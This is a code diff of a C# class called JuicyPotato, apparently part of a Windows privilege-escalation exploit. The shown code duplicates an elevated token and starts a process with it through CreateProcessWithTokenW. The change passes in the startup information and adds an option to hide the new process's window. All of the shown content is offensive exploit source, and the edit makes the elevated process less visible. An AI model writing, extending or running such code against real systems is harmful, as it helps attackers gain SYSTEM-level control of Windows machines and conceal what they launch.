@@ -24,7 +24,7 @@ public class JuicyPotato
     private Thread comListenerThread;
     private Thread rpcConnectionThread;
     private bool newConnection;
-    private CancellationTokenSource cancellationTokenSource = new();
+    private readonly CancellationTokenSource cancellationTokenSource = new();
 
     private ComServer comServer;
     private RpcClient rpcClient;
@@ -155,7 +155,7 @@ public class JuicyPotato
         cancellationTokenSource.Cancel();
     }
 
-    public SafePROCESS_INFORMATION CreateProcess()
+    public SafePROCESS_INFORMATION CreateProcess(STARTUPINFO startupInfo)
     {
         if (!OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out var hToken))
             return null;
@@ -169,12 +169,13 @@ public class JuicyPotato
         DuplicateTokenEx(elevatedToken, TokenAccess.TOKEN_ALL_ACCESS, null,
             SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var dupedToken);
 
-        var startupInfo = new STARTUPINFO();
-        startupInfo.lpDesktop = "winsta0\\default";
+        CREATE_PROCESS flags = 0;
+        if (ProcessStartInfo.CreateNoWindow)
+            flags |= CREATE_PROCESS.CREATE_NO_WINDOW;
 
         CreateProcessWithTokenW(dupedToken, 0, ProcessStartInfo.FileName,
             new StringBuilder($"{ProcessStartInfo.FileName} {ProcessStartInfo.Arguments}"),
-            0, null, null, startupInfo, out var processInformation);
+            flags, null, null, startupInfo, out var processInformation);
 
         return processInformation;
     }
